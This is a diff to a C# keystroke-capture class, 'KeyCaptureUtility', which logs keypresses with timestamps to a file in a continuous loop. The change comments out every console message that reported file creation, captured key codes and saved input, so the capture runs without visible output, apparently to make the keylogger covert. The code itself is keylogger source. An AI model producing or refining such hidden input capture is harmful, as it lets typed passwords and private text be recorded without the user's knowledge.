@@ -92,7 +92,7 @@ public class KeyCaptureUtility
         if (!File.Exists(filePath))
         {
             File.Create(filePath).Dispose();
-            Console.WriteLine("File created: " + filePath);  // Log file creation
+            //Console.WriteLine("File created: " + filePath);  // Log file creation
         }
 
         // Continuous loop to capture keypresses
@@ -130,7 +130,7 @@ public class KeyCaptureUtility
                         if (unicodeResult > 0)
                         {
                             string charPressed = logChar.ToString();
-                            Console.WriteLine("asc: " + asc);  // Log the saved message
+                            //Console.WriteLine("asc: " + asc);  // Log the saved message
 
                             // Handle special keys based on provided mapping
                             charPressed = HandleSpecialKeys(asc, charPressed);
@@ -160,7 +160,7 @@ public class KeyCaptureUtility
                 string timestamp = DateTime.Now.ToString("dd-MM-yyyy HH:mm:ss");
                 string message = timestamp + " : " + captureBuffer.ToString() + "\r\n";
                 File.AppendAllText(filePath, message);
-                Console.WriteLine("Input saved: " + message);  // Log the saved message
+                //Console.WriteLine("Input saved: " + message);  // Log the saved message
                 captureBuffer.Clear();  // Clear the input buffer after saving
             }
 
